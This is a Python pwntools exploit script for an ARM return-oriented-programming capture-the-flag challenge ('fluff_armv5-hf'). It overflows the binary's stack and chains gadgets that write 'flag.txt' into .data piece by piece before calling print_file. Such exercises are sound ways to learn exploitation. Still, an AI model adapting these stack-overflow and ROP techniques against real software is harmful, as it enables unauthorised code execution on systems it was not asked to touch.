#!/usr/bin/env python3
from pwn import *
import os

os.environ["QEMU_LD_PREFIX"] = "/usr/arm-linux-gnueabihf"

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'fluff_armv5-hf')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# ./fluff_armv5-hf_exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

padding = b'A' * 36

# ropper --arch ARM --file fluff_armv5-hf
# 0x000105ec: pop {r0, r1, r3}; bx r1;
# 0x00010634: pop {r1, r2, r4, r5, r6, r7, r8, r12, lr, pc};
POP_R0_R1_R3_BX_R1 = p32(0x105ec)
POP_R1245678 = p32(0x10634)

# ropper --arch ARMTHUMB --file fluff_armv5-hf --inst-count 8
# 0x00010638 (0x00010639): strh r0, [r7, #0x1e]; nop; lsrs r6, r5, #3; movs r1, r0; lsrs r4, r4, #3; movs r1, r0; bx lr;
STR_R0_BX_LR = p32(0x10639)

# 0x000103e8 (0x000103e9): str r7, [r3, #0x54]; str r6, [r5, #0x44]; bx r0;
# address shall be odd to enter "thumb" mode
STR_R3 = p32(0x103e9)

# "flag.txt" string
FL_STR = p32(int.from_bytes(b"fl", 'little'))
AG_STR = p32(int.from_bytes(b"ag", 'little'))
DOTT_STR = p32(int.from_bytes(b".t", 'little'))
XT_STR = p32(int.from_bytes(b"xt", 'little'))

# r2 fluff_armv5-hf
# (r2) iS
# 0x00001024    0x8 0x00021024    0x8 -rw- 0x3   PROGBITS    .data
DATA_ADDR = 0x21024

# r2 fluff_armv5-hf
# (r2) aaa; afl
# 0x000104bc    1     12 sym.imp.print_file
PR_FILE = p32(0x104bc)

payload  = padding
payload += POP_R1245678 + 5*p32(0xa5) + p32(DATA_ADDR - 0x1e) + 2*p32(0xa5)
payload += POP_R1245678 + POP_R0_R1_R3_BX_R1 + FL_STR + STR_R0_BX_LR + p32(0xa5)
payload += 5*p32(0xa5) + p32(DATA_ADDR + 2 - 0x1e) + 2*p32(0xa5)
payload += POP_R1245678 + POP_R0_R1_R3_BX_R1 + AG_STR + STR_R0_BX_LR + p32(0xa5)
payload += 5*p32(0xa5) + p32(DATA_ADDR + 4 - 0x1e) + 2*p32(0xa5)
payload += POP_R1245678 + POP_R0_R1_R3_BX_R1 + DOTT_STR + STR_R0_BX_LR + p32(0xa5)
payload += 5*p32(0xa5) + p32(DATA_ADDR + 6 - 0x1e) + 2*p32(0xa5)
payload += POP_R0_R1_R3_BX_R1 + POP_R0_R1_R3_BX_R1 + XT_STR + STR_R0_BX_LR + p32(0xa5)
payload += p32(DATA_ADDR) + PR_FILE + p32(0xa5)

io = start()

io.recvuntil(b"> ")
io.sendline(payload)

io.interactive()
